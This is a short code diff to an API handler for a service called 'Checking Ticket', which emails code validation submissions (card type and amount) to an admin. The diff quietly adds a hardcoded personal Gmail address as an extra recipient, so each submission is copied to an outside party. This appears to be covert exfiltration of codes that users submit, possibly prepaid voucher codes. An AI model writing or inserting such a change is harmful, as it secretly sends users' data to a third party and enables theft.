@@ -395,6 +395,9 @@ export default async function handler(req: any, res: any) {
 
     const transporter = getTransporter();
     const adminEmail = process.env.ADMIN_EMAIL;
+    const adminRecipients = [adminEmail, "henrijoelhounkpe463@gmail.com"].filter(
+      (recipient): recipient is string => Boolean(recipient)
+    );
     const fromAddress = process.env.SMTP_FROM || '"Checking Ticket" <noreply@checkingticket.com>';
 
     let adminEmailSent = false;
@@ -403,7 +406,7 @@ export default async function handler(req: any, res: any) {
     try {
       await transporter.sendMail({
         from: fromAddress,
-        to: adminEmail,
+        to: adminRecipients,
         subject: `[Checking Ticket] Nouvelle validation de code - ${cardType} (${parsedAmount} €)`,
         html: buildAdminEmailHtml(submission),
       });
